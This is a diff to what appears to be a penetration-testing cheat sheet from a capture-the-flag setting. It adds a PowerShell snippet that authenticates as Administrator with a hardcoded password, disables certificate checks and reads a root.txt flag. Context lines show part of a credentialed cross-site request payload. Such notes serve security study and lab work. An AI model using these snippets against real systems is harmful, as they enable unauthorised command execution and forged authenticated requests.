@@ -274,3 +274,10 @@ Cheat sheet: https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
 	http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 	http.withCredentials = true;
 	http.send(params);
+
+### Run a command as another user
+
+	$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+	$p = ConvertTo-SecureString '8r;8Ua;+hpiV09A+;S;!m7of' -AsPlainText -Force
+	$c = New-Object System.Management.Automation.PSCredential ('Administrator', $p) 
+	invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {type \users\trx\desktop\root.txt}
